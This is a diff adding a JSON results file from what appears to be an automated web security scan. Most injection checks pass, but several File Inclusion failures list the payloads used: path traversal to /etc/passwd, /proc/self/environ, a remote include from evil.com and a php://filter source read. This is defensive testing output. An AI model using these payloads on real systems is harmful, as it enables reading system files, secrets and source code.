@@ -1,0 +1,100 @@
+[
+  {
+    "test": "SQL Injection",
+    "status": "PASS",
+    "details": "No basic SQL injection vulnerabilities detected",
+    "severity": "info",
+    "timestamp": "2025-06-21T10:09:38.951927"
+  },
+  {
+    "test": "Error-Based SQL Injection",
+    "status": "PASS",
+    "details": "No error-based SQL injection vulnerabilities detected",
+    "severity": "info",
+    "timestamp": "2025-06-21T10:09:39.097498"
+  },
+  {
+    "test": "Time-Based SQL Injection",
+    "status": "PASS",
+    "details": "No time-based SQL injection vulnerabilities detected",
+    "severity": "info",
+    "timestamp": "2025-06-21T10:09:39.204625"
+  },
+  {
+    "test": "NoSQL Injection",
+    "status": "PASS",
+    "details": "No NoSQL injection vulnerabilities detected",
+    "severity": "info",
+    "timestamp": "2025-06-21T10:09:39.539344"
+  },
+  {
+    "test": "XSS Input Validation",
+    "status": "PASS",
+    "details": "No XSS vulnerabilities detected",
+    "severity": "info",
+    "timestamp": "2025-06-21T10:09:40.209357"
+  },
+  {
+    "test": "File Inclusion",
+    "status": "FAIL",
+    "details": "File inclusion vulnerability with payload: ../../../etc/passwd",
+    "severity": "high",
+    "timestamp": "2025-06-21T10:09:40.212572"
+  },
+  {
+    "test": "File Inclusion",
+    "status": "FAIL",
+    "details": "File inclusion vulnerability with payload: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "severity": "high",
+    "timestamp": "2025-06-21T10:09:40.215574"
+  },
+  {
+    "test": "File Inclusion",
+    "status": "FAIL",
+    "details": "File inclusion vulnerability with payload: /etc/passwd",
+    "severity": "high",
+    "timestamp": "2025-06-21T10:09:40.218043"
+  },
+  {
+    "test": "File Inclusion",
+    "status": "FAIL",
+    "details": "File inclusion vulnerability with payload: /proc/version",
+    "severity": "high",
+    "timestamp": "2025-06-21T10:09:40.220729"
+  },
+  {
+    "test": "File Inclusion",
+    "status": "FAIL",
+    "details": "File inclusion vulnerability with payload: /proc/self/environ",
+    "severity": "high",
+    "timestamp": "2025-06-21T10:09:40.223482"
+  },
+  {
+    "test": "File Inclusion",
+    "status": "FAIL",
+    "details": "File inclusion vulnerability with payload: http://evil.com/malicious.txt",
+    "severity": "high",
+    "timestamp": "2025-06-21T10:09:40.227808"
+  },
+  {
+    "test": "File Inclusion",
+    "status": "FAIL",
+    "details": "File inclusion vulnerability with payload: file:///etc/passwd",
+    "severity": "high",
+    "timestamp": "2025-06-21T10:09:40.230580"
+  },
+  {
+    "test": "File Inclusion",
+    "status": "FAIL",
+    "details": "File inclusion vulnerability with payload: php://filter/read=convert.base64-encode/resource=index.php",
+    "severity": "high",
+    "timestamp": "2025-06-21T10:09:40.233426"
+  },
+  {
+    "test": "Command Injection",
+    "status": "PASS",
+    "details": "No command injection vulnerabilities detected",
+    "severity": "info",
+    "timestamp": "2025-06-21T10:09:40.264050"
+  }
+]
